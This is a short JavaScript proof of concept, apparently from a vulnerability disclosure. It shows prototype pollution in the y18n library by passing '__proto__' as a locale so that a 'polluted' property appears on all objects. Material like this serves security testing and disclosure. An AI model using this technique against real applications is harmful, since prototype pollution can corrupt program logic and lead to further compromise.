const y18n = require("y18n")();
y18n.setLocale("__proto__");
y18n.updateLocale({ polluted: true });
console.log(polluted); // true
